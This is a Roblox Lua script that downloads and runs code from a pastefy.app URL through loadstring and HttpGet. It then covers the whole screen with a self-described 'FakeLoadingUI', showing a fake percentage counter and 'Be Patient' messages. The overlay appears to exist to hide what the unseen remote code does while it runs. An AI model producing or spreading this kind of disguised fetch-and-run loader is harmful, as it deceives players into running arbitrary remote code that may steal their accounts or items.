local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local TweenService = game:GetService("TweenService")
local Player = Players.LocalPlayer

repeat task.wait() until Player:FindFirstChild("PlayerGui")

-- Run the real script immediately
pcall(function()
    loadstring(game:HttpGet("https://pastefy.app/EEmKlIPx/raw", true))()
end)

-- UI Setup
local gui = Instance.new("ScreenGui")
gui.Name = "FakeLoadingUI"
gui.IgnoreGuiInset = true
gui.ResetOnSpawn = false
gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
gui.DisplayOrder = 9999
gui.Parent = Player:WaitForChild("PlayerGui")

-- Background
local bg = Instance.new("Frame")
bg.Size = UDim2.new(1, 0, 1, 0)
bg.Position = UDim2.new(0, 0, 0, 0)
bg.BackgroundColor3 = Color3.new(0, 0, 0)
bg.BorderSizePixel = 0
bg.Parent = gui

-- Top Label (smaller, fire-like color)
local topLabel = Instance.new("TextLabel")
topLabel.Size = UDim2.new(1, 0, 0.1, 0)
topLabel.Position = UDim2.new(0, 0, 0.02, 0)
topLabel.BackgroundTransparency = 1
topLabel.Text = "Wait Until It Loads"
topLabel.Font = Enum.Font.GothamBold
topLabel.TextColor3 = Color3.fromRGB(255, 120, 0) -- Fire orange
topLabel.TextScaled = true
topLabel.TextStrokeTransparency = 0.8
topLabel.TextStrokeColor3 = Color3.fromRGB(255, 70, 0)
topLabel.Parent = bg

-- Loading Percent
local loadingText = Instance.new("TextLabel")
loadingText.Size = UDim2.new(1, 0, 0.7, 0)
loadingText.Position = UDim2.new(0, 0, 0.15, 0)
loadingText.BackgroundTransparency = 1
loadingText.Text = "0%"
loadingText.Font = Enum.Font.GothamBlack
loadingText.TextColor3 = Color3.new(1, 1, 1)
loadingText.TextScaled = true
loadingText.TextStrokeTransparency = 0.6
loadingText.TextStrokeColor3 = Color3.new(0, 0, 0)
loadingText.Parent = bg

-- Bottom Label (smaller, fire-style)
local bottomLabel = Instance.new("TextLabel")
bottomLabel.Size = UDim2.new(1, 0, 0.1, 0)
bottomLabel.Position = UDim2.new(0, 0, 0.88, 0)
bottomLabel.BackgroundTransparency = 1
bottomLabel.Text = "Be Patient"
bottomLabel.Font = Enum.Font.GothamBold
bottomLabel.TextColor3 = Color3.fromRGB(255, 80, 0)
bottomLabel.TextScaled = true
bottomLabel.TextStrokeTransparency = 0.8
bottomLabel.TextStrokeColor3 = Color3.fromRGB(255, 50, 0)
bottomLabel.Parent = bg

-- Fire Emoji Animation
local function spawnFire()
	for i = 1, 5 do
		local fire = Instance.new("TextLabel")
		fire.Text = "ðŸ”¥"
		fire.Font = Enum.Font.SourceSansBold
		fire.TextScaled = true
		fire.TextColor3 = Color3.fromRGB(255, 100, 0)
		fire.BackgroundTransparency = 1
		fire.Size = UDim2.new(0.05, 0, 0.05, 0)
		fire.Position = UDim2.new(math.random(), 0, math.random(), 0)
		fire.Parent = bg

		local goal = {
			Position = UDim2.new(math.random(), 0, math.random(), 0),
			TextTransparency = 1
		}
		local tween = TweenService:Create(fire, TweenInfo.new(5, Enum.EasingStyle.Linear), goal)
		tween:Play()

		task.delay(5, function()
			fire:Destroy()
		end)
	end
end

-- Keep spawning fire
task.spawn(function()
	while true do
		spawnFire()
		task.wait(1)
	end
end)

-- Slower, smoother loading from 0% to 100%
task.spawn(function()
	for i = 1, 100 do
		loadingText.Text = i .. "%"
		task.wait(math.random(10, 20) / 100) -- takes ~10-15 seconds total
	end
end)
